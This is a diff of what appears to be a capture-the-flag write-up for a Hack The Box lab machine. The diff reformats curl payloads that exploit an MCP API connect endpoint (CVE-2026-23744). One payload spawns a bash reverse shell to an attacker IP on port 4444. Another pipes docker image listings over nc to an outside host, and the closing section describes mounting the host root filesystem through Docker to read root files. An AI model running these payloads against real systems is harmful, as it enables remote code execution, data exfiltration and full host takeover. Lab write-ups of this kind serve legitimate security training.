@@ -9,7 +9,17 @@
 - CVE-2026-23744: Exploiting a critical vulnerability in the MCP API to achieve Remote Code Execution (RCE).
 - Payload Delivery: Utilizing `curl` to inject a malicious JSON configuration into the `/api/mcp/connect` endpoint.
 ## Reverse shell
-		curl -k https://mcp.kobold.htb:443/api/mcp/connect --header "Content-Type: application/json" --data '{"serverConfig":{"command":"/bin/bash","args":["-c", "bash -i >& /dev/tcp/10.10.15.175/4444 0>&1"],"env":{}},"serverId":"rev_shell"}'
+		curl -k https://mcp.kobold.htb:443/api/mcp/connect \
+		-H "Content-Type: application/json" \
+		-d '{
+			"serverConfig": {
+				"command":"/bin/bash",
+				"args":["-c", "bash -i >& /dev/tcp/10.10.15.175/4444 0>&1"],
+				"env":{}
+			},
+			"serverId":"rev_shell"
+		}'
+			
 Establishing a callback to `10.10.15.175:4444` via a bash interactive shell.
 
 ## Persistence and Stabilization
@@ -27,12 +37,12 @@ Establishing a callback to `10.10.15.175:4444` via a bash interactive shell.
 		curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
 		-H "Content-Type: application/json" \
 		-d '{
-		  "serverConfig": {
-		    "command": "sg",
-		    "args": ["docker", "-c", "docker images | nc 10.10.15.124 4444"],
-		    "env": {}
-		  },
-		  "serverId": "docker"
+			"serverConfig": {
+				"command": "sg",
+		    	"args": ["docker", "-c", "docker images | nc 10.10.15.124 4444"],
+		    	"env": {}
+			},
+			"serverId": "docker"
 		}'
 # Final exploitation
 creating new Docker container using enumerated service image, and mounting `/` as `/exp`, which allows to read every system file, including `/root/root.txt` leading to flag compromise
